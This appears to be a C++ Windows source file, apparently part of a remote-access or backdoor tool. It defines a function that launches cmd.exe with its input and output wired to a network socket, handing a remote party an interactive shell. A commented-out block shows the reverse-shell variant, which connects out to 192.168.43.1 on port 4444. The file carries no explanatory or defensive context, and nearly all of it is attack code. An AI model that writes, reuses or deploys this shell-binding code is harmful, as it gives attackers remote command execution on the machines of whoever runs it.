#pragma once
#define _WINSOCK_DEPCRECATED_NO_WARNINGS 1

#include <Winsock2.h>
#include <Windows.h>
#include <iostream>
#pragma comment(lib, "Ws2_32.lib")

int dropIntoShell(SOCKET ClientSocket)
{

    printf("Dropping into Shell\n");

    /*
    std::string rem_host = "192.168.43.1";
    int rem_port = 4444;

    WSADATA wsaData;

    // Call WSAStartup()
    int WSAStartup_Result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (WSAStartup_Result != 0) {
        std::cout << "[-] WSAStartup failed.";
        return 1;
    }

    // Call WSASocket()
    SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, NULL);

    // Create sockaddr_in struct
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(rem_host.c_str());
    sa.sin_port = htons(rem_port);

    // Call connect()
    int connect_Result = connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
    if (connect_Result != 0) {
        std::cout << "[-] connect failed.";
        return 1;
    }
    */

    // Call CreateProcessA()
    STARTUPINFO si;
    //memset(&si, 0, sizeof(si));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES);
    si.hStdInput = (HANDLE)ClientSocket;
    si.hStdOutput = (HANDLE)ClientSocket;
    si.hStdError = (HANDLE)ClientSocket;
    //si.hStdInput = (HANDLE)mysocket;
    //si.hStdOutput = (HANDLE)mysocket;
    //si.hStdError = (HANDLE)mysocket;
    PROCESS_INFORMATION pi;
    int error;
    error = CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    printf("Error is %d\n", error);

    error = WaitForSingleObject(pi.hProcess, INFINITE);
    printf("Process Ended: %d\n", error);
    return 0;
}
